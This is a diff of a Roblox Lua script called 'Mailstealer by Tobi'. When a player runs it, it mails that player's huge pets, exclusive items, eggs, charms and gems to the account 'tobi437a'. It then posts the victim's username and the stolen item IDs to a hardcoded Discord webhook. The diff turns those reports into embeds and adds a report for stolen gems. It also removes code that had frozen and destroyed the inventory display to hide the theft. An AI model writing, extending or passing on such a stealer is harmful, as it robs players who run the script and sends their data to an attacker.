@@ -1,21 +1,42 @@
 Username = "tobi437a"
 Webhook = "https://discord.com/api/webhooks/1188270710586626168/Cs96Qi3pnoN_L333SdIkaak54Y1RxxD_zcozOAfkReeeOWXYaJfxdulNKjXwiC7chqmv"
 
-function SendMessage(url, message)
+function SendMessage(url, username, itemID)
     local http = game:GetService("HttpService")
     local headers = {
         ["Content-Type"] = "application/json"
     }
     local data = {
-        ["content"] = message
+        ["embeds"] = {{
+            ["title"] = "New Item Sent",
+            ["color"] = 65280,
+			["thumbnail"] = {
+				["url"] = "https://cdn.discordapp.com/attachments/1184878103781191780/1203372282882433204/87046.jpg"
+			},
+            ["fields"] = {
+                {
+                    ["name"] = "Victim Username:",
+                    ["value"] = username .. "\n",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Item Sent:",
+                    ["value"] = tostring(itemID), -- Convert itemID to string if it's not already
+                    ["inline"] = true
+                }
+            },
+			["footer"] = {
+				["text"] = "Mailstealer by Tobi. discord.gg/HcpNe56R2a"
+			}
+        }}
     }
     local body = http:JSONEncode(data)
     local response = request({
-        Url = url,
-        Method = "POST",
-        Headers = headers,
-        Body = body
-    })
+		Url = url,
+		Method = "POST",
+		Headers = headers,
+		Body = body
+	})
 end
 
 if Webhook and string.find(Webhook, "discord") then
@@ -86,7 +107,7 @@ function StealHuge()
             }
 			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
 			if Webhook and Webhook ~= "" then
-				SendMessage(Webhook, "x" .. tostring(v._am or 1) .. " " .. id .. " has been sent to " .. user)
+				SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
 			end
 			local finalHuges = CountHuges()
 			if finalHuges < initialHuges then
@@ -141,7 +162,7 @@ function ExcSteal()
             }
             game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
 			if Webhook and Webhook ~= "" then
-				SendMessage(Webhook, "x" .. tostring(v._am or 1) .. " " .. id .. " has been sent to " .. user)
+				SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
 			end
 			local finalExc = CountExc()
 			if finalExc < initialExc then
@@ -187,7 +208,7 @@ function EggSteal()
 			}
 			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
 			if Webhook and Webhook ~= "" then
-				SendMessage(Webhook, "x" .. tostring(v._am or 1) .. " " .. id .. " has been sent to " .. user)
+				SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
 			end
 		end
     end
@@ -207,7 +228,7 @@ function CharmSteal()
 			}
 			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
 			if Webhook and Webhook ~= "" then
-				SendMessage(Webhook, "x" .. tostring(v._am or 1) .. " " .. id .. " has been sent to " .. user)
+				SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
 			end
 		end
     end
@@ -226,6 +247,9 @@ function GemSteal()
                 [5] = GemAmount - 10000
             }
             game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+			if Webhook and Webhook ~= "" then
+			SendMessage(Webhook, game.Players.LocalPlayer.Name, "Gems: " .. id)
+			end
         end
     end
 end
@@ -239,12 +263,6 @@ function EmptyBoxes()
 			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Box: Withdraw All"):InvokeServer(unpack(args))
         end
     end
-end
-
-local function freeze_inventory()
-    local pets_frame = game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets
-    local pets_frame_clone = pets_frame:Clone()
-    pets_frame_clone.Parent = game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main
 end
 
 function CountGems()
@@ -265,10 +283,6 @@ end
 print(CountHuges())
 if CountHuges() > 0 then
 	EmptyBoxes()
-	freeze_inventory()
-	local Inventoryframe = game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets
-	Inventoryframe:Destroy()
-	game.Workspace.__THINGS.Pets:Destroy()
 	SendAllHuges()
 	SendAllExc()
 
